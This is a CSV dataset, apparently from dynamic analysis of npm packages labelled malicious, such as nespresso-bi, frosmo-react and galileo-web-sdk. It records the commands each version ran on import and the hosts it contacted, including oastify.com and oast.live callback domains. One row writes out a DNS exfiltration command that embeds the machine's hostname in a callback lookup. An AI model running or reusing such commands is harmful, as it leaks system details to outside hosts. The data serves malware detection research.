Class,Package_Ecosystem,Package_Name,Package_Version,Analysis_import_Commands_Command,Analysis_import_Sockets_Hostnames,Analysis_import_Sockets_Address
malicious,npm,nespresso-bi,4.3.9-9.0,hostname,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.3.9-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.3.9-9.0,curl,38.rs,
malicious,npm,nespresso-bi,4.3.9-9.0,hostname,38.rs,
malicious,npm,nespresso-bi,4.3.9-9.0,head,,
malicious,npm,nespresso-bi,4.3.9-9.0,ls,38.rs,
malicious,npm,nespresso-bi,4.3.9-9.0,id,,
malicious,npm,nespresso-bi,4.3.9-9.0,head,38.rs,
malicious,npm,nespresso-bi,4.3.9-9.0,cat,38.rs,
malicious,npm,nespresso-bi,4.3.9-9.0,ls,,
malicious,npm,nespresso-bi,4.3.9-9.0,id,38.rs,
malicious,npm,nespresso-bi,4.3.9-9.0,cat,,
malicious,npm,nespresso-bi,4.4.9-9.0,ls,,8.8.8.8
malicious,npm,nespresso-bi,4.4.9-9.0,ip,,8.8.8.8
malicious,npm,nespresso-bi,4.4.9-9.0,ip,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.4.9-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.4.9-9.0,ip,38.rs,
malicious,npm,nespresso-bi,4.4.9-9.0,curl,,8.8.8.8
malicious,npm,nespresso-bi,4.4.9-9.0,head,,8.8.8.8
malicious,npm,nespresso-bi,4.4.9-9.0,ip,,
malicious,npm,nespresso-bi,4.4.9-9.0,head,,
malicious,npm,nespresso-bi,4.4.9-9.0,ls,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.4.9-9.0,curl,38.rs,
malicious,npm,nespresso-bi,4.4.9-9.0,head,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.4.9-9.0,head,38.rs,
malicious,npm,nespresso-bi,4.4.9-9.0,ls,,
malicious,npm,nespresso-bi,4.4.9-9.0,ls,38.rs,
malicious,npm,nespresso-bi,4.4.9-9.0,curl,,
malicious,npm,nespresso-bi,4.5.9-9.0,ls,,8.8.8.8
malicious,npm,nespresso-bi,4.5.9-9.0,ls,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.5.9-9.0,ifconfig,,8.8.8.8
malicious,npm,nespresso-bi,4.5.9-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.5.9-9.0,curl,,8.8.8.8
malicious,npm,nespresso-bi,4.5.9-9.0,ifconfig,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.5.9-9.0,head,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.5.9-9.0,head,,8.8.8.8
malicious,npm,nespresso-bi,4.5.9-9.0,ifconfig,38.rs,
malicious,npm,nespresso-bi,4.5.9-9.0,head,,
malicious,npm,nespresso-bi,4.5.9-9.0,ifconfig,,
malicious,npm,nespresso-bi,4.5.9-9.0,ls,38.rs,
malicious,npm,nespresso-bi,4.5.9-9.0,curl,,
malicious,npm,nespresso-bi,4.5.9-9.0,curl,38.rs,
malicious,npm,nespresso-bi,4.5.9-9.0,ls,,
malicious,npm,nespresso-bi,4.5.9-9.0,head,38.rs,
malicious,npm,nespresso-bi,4.6.9-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.6.9-9.0,curl,,8.8.8.8
malicious,npm,nespresso-bi,4.6.9-9.0,ls,,8.8.8.8
malicious,npm,nespresso-bi,4.6.9-9.0,ls,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.6.9-9.0,head,38.rs,109.123.242.116
malicious,npm,nespresso-bi,4.6.9-9.0,head,,8.8.8.8
malicious,npm,nespresso-bi,4.6.9-9.0,ls,,
malicious,npm,nespresso-bi,4.6.9-9.0,ls,38.rs,
malicious,npm,nespresso-bi,4.6.9-9.0,head,,
malicious,npm,nespresso-bi,4.6.9-9.0,head,38.rs,
malicious,npm,nespresso-bi,4.6.9-9.0,curl,38.rs,
malicious,npm,nespresso-bi,4.6.9-9.0,curl,,
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.3.99-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.3.99-9.0,head,,8.8.8.8
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.3.99-9.0,curl,38.rs,
malicious,npm,nespresso-bi,3.3.99-9.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.3.99-9.0,curl,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,,
malicious,npm,nespresso-bi,3.3.99-9.0,curl,,8.8.8.8
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,,8.8.8.8
malicious,npm,nespresso-bi,3.3.99-9.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,,8.8.8.8
malicious,npm,nespresso-bi,3.3.99-9.0,head,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,ifconfig.me,
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.3.99-9.0,head,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.3.99-9.0,curl,,
malicious,npm,nespresso-bi,3.3.99-9.0,whoami,38.rs,
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,38.rs,
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,ifconfig.me,
malicious,npm,nespresso-bi,3.3.99-9.0,head,ifconfig.me,
malicious,npm,nespresso-bi,3.3.99-9.0,head,,
malicious,npm,nespresso-bi,3.3.99-9.0,head,38.rs,
malicious,npm,nespresso-bi,3.3.99-9.0,curl,ifconfig.me,
malicious,npm,nespresso-bi,3.3.99-9.0,hostname,,
malicious,npm,nespresso-bi,3.4.99-9.0,head,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.4.99-9.0,curl,,8.8.8.8
malicious,npm,nespresso-bi,3.4.99-9.0,cat,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.4.99-9.0,cat,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.4.99-9.0,cat,ifconfig.me,
malicious,npm,nespresso-bi,3.4.99-9.0,cat,,8.8.8.8
malicious,npm,nespresso-bi,3.4.99-9.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.4.99-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.4.99-9.0,head,,8.8.8.8
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,,8.8.8.8
malicious,npm,nespresso-bi,3.4.99-9.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.4.99-9.0,curl,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,,8.8.8.8
malicious,npm,nespresso-bi,3.4.99-9.0,cat,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.4.99-9.0,head,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.4.99-9.0,head,38.rs,
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,ifconfig.me,
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,,
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,ifconfig.me,
malicious,npm,nespresso-bi,3.4.99-9.0,cat,38.rs,
malicious,npm,nespresso-bi,3.4.99-9.0,head,,
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,38.rs,
malicious,npm,nespresso-bi,3.4.99-9.0,curl,,
malicious,npm,nespresso-bi,3.4.99-9.0,hostname,,
malicious,npm,nespresso-bi,3.4.99-9.0,cat,,
malicious,npm,nespresso-bi,3.4.99-9.0,curl,ifconfig.me,
malicious,npm,nespresso-bi,3.4.99-9.0,whoami,38.rs,
malicious,npm,nespresso-bi,3.4.99-9.0,curl,38.rs,
malicious,npm,nespresso-bi,3.4.99-9.0,head,ifconfig.me,
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.6.99-9.0,curl,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.6.99-9.0,curl,ifconfig.me,
malicious,npm,nespresso-bi,3.6.99-9.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.6.99-9.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,,8.8.8.8
malicious,npm,nespresso-bi,3.6.99-9.0,curl,,8.8.8.8
malicious,npm,nespresso-bi,3.6.99-9.0,id,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,,8.8.8.8
malicious,npm,nespresso-bi,3.6.99-9.0,head,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.6.99-9.0,id,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.6.99-9.0,head,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,ifconfig.me,
malicious,npm,nespresso-bi,3.6.99-9.0,head,,8.8.8.8
malicious,npm,nespresso-bi,3.6.99-9.0,id,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,,
malicious,npm,nespresso-bi,3.6.99-9.0,curl,38.rs,109.123.242.116
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,nespresso-bi,3.6.99-9.0,id,ifconfig.me,
malicious,npm,nespresso-bi,3.6.99-9.0,curl,38.rs,
malicious,npm,nespresso-bi,3.6.99-9.0,id,,8.8.8.8
malicious,npm,nespresso-bi,3.6.99-9.0,head,ifconfig.me,
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,ifconfig.me,
malicious,npm,nespresso-bi,3.6.99-9.0,id,,
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,38.rs,
malicious,npm,nespresso-bi,3.6.99-9.0,head,,
malicious,npm,nespresso-bi,3.6.99-9.0,curl,,
malicious,npm,nespresso-bi,3.6.99-9.0,head,38.rs,
malicious,npm,nespresso-bi,3.6.99-9.0,hostname,,
malicious,npm,nespresso-bi,3.6.99-9.0,whoami,38.rs,
malicious,npm,nespresso-bi,3.6.99-9.0,id,38.rs,
malicious,npm,@portal-packages/core,15.99.99,whoami,,52.55.226.14
malicious,npm,@portal-packages/core,15.99.99,whoami,,
malicious,npm,@portal-packages/core,15.105.105,curl,ifconfig.me,34.117.118.44
malicious,npm,@portal-packages/core,15.105.105,curl,,8.8.8.8
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,ifconfig.me,34.117.118.44
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,,
malicious,npm,@portal-packages/core,15.105.105,pwd,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,@portal-packages/core,15.105.105,pwd,,8.8.8.8
malicious,npm,@portal-packages/core,15.105.105,curl,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,3.248.33.252
malicious,npm,@portal-packages/core,15.105.105,pwd,ifconfig.me,34.117.118.44
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,3.248.33.252
malicious,npm,@portal-packages/core,15.105.105,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,,8.8.8.8
malicious,npm,@portal-packages/core,15.105.105,curl,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,54.77.139.23
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,54.77.139.23
malicious,npm,@portal-packages/core,15.105.105,curl,ifconfig.me,
malicious,npm,@portal-packages/core,15.105.105,pwd,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,3.248.33.252
malicious,npm,@portal-packages/core,15.105.105,curl,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,
malicious,npm,@portal-packages/core,15.105.105,pwd,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,54.77.139.23
malicious,npm,@portal-packages/core,15.105.105,pwd,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,nsjpass0s5srstwhgg0mz6jr0i69u4it.oastify.com,
malicious,npm,@portal-packages/core,15.105.105,curl -4 https://ifconfig.me,ifconfig.me,
malicious,npm,@portal-packages/core,15.105.105,curl,,
malicious,npm,@portal-packages/core,15.105.105,pwd,ifconfig.me,
malicious,npm,@portal-packages/core,15.105.105,pwd,,
malicious,npm,galileo-web-sdk,0.1.7,nslookup $(cat /etc/hostname).test.em4uohucwa3j5z0bvfeet062zt5ktbkz9.oastify.com,,8.8.8.8
malicious,npm,galileo-web-sdk,0.1.7,cat,,8.8.8.8
malicious,npm,galileo-web-sdk,0.1.7,cat,,
malicious,npm,galileo-web-sdk,0.1.7,nslookup $(cat /etc/hostname).test.em4uohucwa3j5z0bvfeet062zt5ktbkz9.oastify.com,,
malicious,npm,galileo-web-sdk,0.1.7,nslookup,,
malicious,npm,galileo-web-sdk,0.1.7,nslookup,,8.8.8.8
malicious,npm,frosmo-react,1.999.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,1.999.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,1.999.0,nslookup,,8.8.8.8
malicious,npm,frosmo-react,1.999.0,hostname,,
malicious,npm,frosmo-react,1.999.0,head,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,1.999.0,whoami,,8.8.8.8
malicious,npm,frosmo-react,1.999.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,1.999.0,nslookup,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,1.999.0,curl,,8.8.8.8
malicious,npm,frosmo-react,1.999.0,hostname,,8.8.8.8
malicious,npm,frosmo-react,1.999.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,1.999.0,head,ifconfig.me,
malicious,npm,frosmo-react,1.999.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,1.999.0,head,,8.8.8.8
malicious,npm,frosmo-react,1.999.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,1.999.0,head,,
malicious,npm,frosmo-react,1.999.0,curl,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,1.999.0,whoami,,
malicious,npm,frosmo-react,1.999.0,nslookup,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,1.999.0,hostname,ifconfig.me,
malicious,npm,frosmo-react,1.999.0,curl,,
malicious,npm,frosmo-react,1.999.0,nslookup,,
malicious,npm,frosmo-react,1.999.0,curl,ifconfig.me,
malicious,npm,frosmo-react,1.999.0,whoami,ifconfig.me,
malicious,npm,frosmo-react,1.999.0,nslookup,ifconfig.me,
malicious,npm,frosmo-react,10.999.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,10.999.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,10.999.0,hostname,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,10.999.0,whoami,,8.8.8.8
malicious,npm,frosmo-react,10.999.0,head,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,10.999.0,curl,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,10.999.0,whoami,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,10.999.0,curl,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,10.999.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,10.999.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,10.999.0,hostname,,8.8.8.8
malicious,npm,frosmo-react,10.999.0,curl,,8.8.8.8
malicious,npm,frosmo-react,10.999.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,10.999.0,head,,8.8.8.8
malicious,npm,frosmo-react,10.999.0,whoami,ifconfig.me,
malicious,npm,frosmo-react,10.999.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,10.999.0,head,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,10.999.0,hostname,,
malicious,npm,frosmo-react,10.999.0,head,,
malicious,npm,frosmo-react,10.999.0,hostname,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,10.999.0,curl,,
malicious,npm,frosmo-react,10.999.0,hostname,ifconfig.me,
malicious,npm,frosmo-react,10.999.0,head,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,10.999.0,whoami,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,10.999.0,whoami,,
malicious,npm,frosmo-react,10.999.0,curl,ifconfig.me,
malicious,npm,frosmo-react,10.999.0,head,ifconfig.me,
malicious,npm,frosmo-react,10.999.0,curl,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,16.111.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,16.111.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,16.111.0,head,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,16.111.0,curl,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,16.111.0,curl,,
malicious,npm,frosmo-react,16.111.0,curl,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,16.111.0,hostname,,
malicious,npm,frosmo-react,16.111.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,16.111.0,whoami,,8.8.8.8
malicious,npm,frosmo-react,16.111.0,hostname,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,16.111.0,hostname,,8.8.8.8
malicious,npm,frosmo-react,16.111.0,head,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,16.111.0,whoami,,
malicious,npm,frosmo-react,16.111.0,head,,8.8.8.8
malicious,npm,frosmo-react,16.111.0,head,,
malicious,npm,frosmo-react,16.111.0,curl,,8.8.8.8
malicious,npm,frosmo-react,16.111.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,16.111.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,16.111.0,whoami,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,16.111.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,16.111.0,hostname,ifconfig.me,
malicious,npm,frosmo-react,16.111.0,whoami,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,178.128.210.172
malicious,npm,frosmo-react,16.111.0,curl,ifconfig.me,
malicious,npm,frosmo-react,16.111.0,head,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,16.111.0,head,ifconfig.me,
malicious,npm,frosmo-react,16.111.0,curl,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,16.111.0,hostname,cnpt5m6qnjqbi6spteigbnuj8n1oxu5y8.oast.live,
malicious,npm,frosmo-react,16.111.0,whoami,ifconfig.me,
malicious,npm,frosmo-react,17.115.0,whoami,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,17.115.0,head,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,17.115.0,whoami,,8.8.8.8
malicious,npm,frosmo-react,17.115.0,curl,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,17.115.0,whoami,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,178.128.212.209
malicious,npm,frosmo-react,17.115.0,hostname,,8.8.8.8
malicious,npm,frosmo-react,17.115.0,head,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,178.128.212.209
malicious,npm,frosmo-react,17.115.0,whoami,,
malicious,npm,frosmo-react,17.115.0,curl,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,17.115.0,hostname,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,
malicious,npm,frosmo-react,17.115.0,head,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,17.115.0,curl,,8.8.8.8
malicious,npm,frosmo-react,17.115.0,head,,
malicious,npm,frosmo-react,17.115.0,curl,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,178.128.212.209
malicious,npm,frosmo-react,17.115.0,head,,8.8.8.8
malicious,npm,frosmo-react,17.115.0,hostname,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,178.128.212.209
malicious,npm,frosmo-react,17.115.0,hostname,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,17.115.0,whoami,ifconfig.me,34.117.118.44
malicious,npm,frosmo-react,17.115.0,hostname,ifconfig.me,2600:1901:0:bbc3::
malicious,npm,frosmo-react,17.115.0,curl,ifconfig.me,
malicious,npm,frosmo-react,17.115.0,whoami,ifconfig.me,
malicious,npm,frosmo-react,17.115.0,hostname,,
malicious,npm,frosmo-react,17.115.0,hostname,ifconfig.me,
malicious,npm,frosmo-react,17.115.0,curl,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,
malicious,npm,frosmo-react,17.115.0,curl,,
malicious,npm,frosmo-react,17.115.0,head,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,
malicious,npm,frosmo-react,17.115.0,head,ifconfig.me,
malicious,npm,frosmo-react,17.115.0,whoami,cnq0damqnjq5am1jsjsgx5pw41egohqqn.oast.pro,
